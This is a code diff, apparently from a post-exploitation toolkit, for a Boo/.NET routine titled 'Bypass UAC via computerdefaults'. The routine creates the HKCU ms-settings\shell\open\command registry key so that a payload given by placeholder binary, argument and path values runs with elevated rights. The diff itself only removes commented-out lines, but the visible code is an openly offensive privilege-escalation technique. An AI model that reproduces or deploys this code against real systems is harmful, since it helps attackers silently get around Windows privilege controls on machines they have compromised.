@@ -5,13 +5,8 @@ import System.Diagnostics
 
 public static def BypassUAC(binary as string, arguments as string, path as string):
 		Console.WriteLine('[+] Starting Bypass UAC via computerdefaults.')
-		#payload = ''
 		if binary.Length > 0:
-			#payload = args[0]
 			Console.WriteLine(('[+] Payload to be Executed ' + path + binary + arguments))
-		#else:
-		#	Console.WriteLine('[+] No Payload specified. Executing cmd.exe.')
-		#	payload = 'C:\\Windows\\System32\\cmd.exe'
 		try:
 			key as Microsoft.Win32.RegistryKey
 			key = Registry.CurrentUser.CreateSubKey('Software\\Classes\\ms-settings\\shell\\open\\command')
@@ -53,12 +48,6 @@ public static def BypassUAC(binary as string, arguments as string, path as strin
 		//return false;
 		
 public static def Main():
-	#binary = "BINARY"
-    #args = 'powershell'
-    #path = `PATH`
-    #processId = PROCESS_ID
-
-
 	binary = "BINARY "
 	arguments = "ARGUMENTS"
 	path = `PATH`
